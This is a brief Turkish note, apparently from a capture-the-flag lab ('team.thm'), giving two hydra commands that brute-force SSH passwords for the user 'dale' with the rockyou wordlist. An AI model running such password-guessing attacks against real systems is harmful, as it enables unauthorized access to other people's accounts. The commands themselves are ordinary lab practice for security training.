*** ssh için dale ismi ile bruteforce ***

``` bash
hydra -l dale -P /usr/share/wordlists/rockyou.txt  ssh://team.thm
```
veya

``` bash
hydra -l dale -P /usr/share/wordlists/rockyou.txt  ssh://10.10.10.10
```
